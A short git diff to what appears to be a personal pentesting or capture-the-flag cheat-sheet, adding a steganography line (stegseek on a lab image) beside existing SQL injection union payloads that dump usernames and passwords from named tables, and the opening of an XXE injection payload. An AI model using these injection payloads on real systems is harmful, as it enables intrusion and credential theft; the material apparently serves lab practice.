@@ -237,6 +237,10 @@ git push origin master
 > 1. ```bash  search=mary' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM users.UserDetails-- ;```
 > 1. ```bash 0' union select 1,GROUP_CONCAT(CONCAT(id,":",user,":",pass)),3,4,5,6 FROM darkhole_2.ssh-- -;```
 	
+
+#### Stegnography
+> 1. ```bash stegseek doubletrouble.jpg```
+	
 #### XXE injection
 ```bash
 <?xml  version="1.0" encoding="ISO-8859-1"?>
